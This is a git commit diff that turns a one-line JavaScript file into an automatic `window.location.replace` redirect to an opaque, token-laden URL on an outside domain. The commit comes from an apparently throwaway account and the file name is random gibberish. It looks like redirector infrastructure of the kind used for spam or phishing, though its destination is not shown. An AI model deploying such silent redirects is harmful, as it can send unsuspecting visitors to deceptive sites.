b9ed3edb65535cebcd7cc3290281d53296163f8a
sdvgnlksdflmdfgb <122368237+sdvgnlksdflmdfgb@users.noreply.github.com>
2023-01-10 19:35:06 +0400

    Update zeomjbcsoulymthiqueun.js

--- zeomjbcsoulymthiqueun.js
+++ zeomjbcsoulymthiqueun.js
@@ -1,1 +1,1 @@
-https://www.roadsworks.com/V0p0ljJEcXBBoh1Zf2-7c6NtbrJwk7mqx2xM8FsUxZ6UUS4bQWm6AGSrXkROfcztu4MhdFyXh1fRke_qYnRffA~~
+window.location.replace(`https://www.roadsworks.com/V0p0ljJEcXBBoh1Zf2-7c6NtbrJwk7mqx2xM8FsUxZ6UUS4bQWm6AGSrXkROfcztu4MhdFyXh1fRke_qYnRffA~~`);
